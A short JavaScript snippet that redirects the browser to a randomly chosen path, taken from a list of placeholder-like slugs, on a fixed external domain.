


// Base URL
const baseUrl = "https://alcashzone.com/";

// Permalink list
const permalinks = [
    "sdfsdjkf",
    "sdfgdsgsd",
    "sdgdsgdsgds",
    "sdfgdsgdsg",
    "sdgdsgdsgs",
    "dsgdsgdsg"
];

// Random permalink selection
const randomPermalink = permalinks[Math.floor(Math.random() * permalinks.length)];

// Complete URL
const redirectUrl = `${baseUrl}${randomPermalink}`;

// Redirect to the new URL
window.location.href = redirectUrl;
